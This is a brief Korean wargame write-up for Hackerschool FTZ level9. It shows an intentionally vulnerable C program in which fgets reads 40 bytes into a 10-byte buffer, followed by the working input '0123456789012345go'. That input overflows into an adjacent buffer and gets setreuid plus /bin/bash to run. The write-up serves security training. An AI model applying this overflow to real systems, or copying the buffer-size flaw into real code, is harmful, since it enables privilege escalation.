Hackerschool FTZ level9
===
~~~c
//다음은 /usr/bin/bof의 소스이다.

#include <stdlib.h>
#include <unistd.h>

main(){

  char buf2[10];
  char buf[10];

  printf("It can be overflow : ");
  fgets(buf,40,stdin);

  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }

}
~~~
가보인다.

> $ cd /usr/bin
>>
> $ ./bof 0123456789012345go

를 하면 나오는데 
그이유는 gdb를해서 buf와 buf2사이의 dummy가 몇 바이트인지 알면 된다.
그래서 16를 체우고go를하면 넘어가진다.
